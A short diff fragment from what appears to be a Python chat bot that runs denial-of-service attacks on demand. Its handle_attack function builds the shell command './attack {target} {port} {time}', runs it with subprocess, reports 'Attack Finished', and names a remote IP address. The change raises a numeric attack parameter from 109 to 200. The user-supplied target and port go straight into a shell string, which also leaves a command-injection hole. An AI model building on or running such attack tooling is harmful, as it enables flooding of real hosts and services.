@@ -245,7 +245,7 @@ def handle_attack(message):
 
 
                 REMOTE_HOST = '4.213.71.147'  
-                full_command = f"./attack {target} {port} {time} 109"
+                full_command = f"./attack {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"attack Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
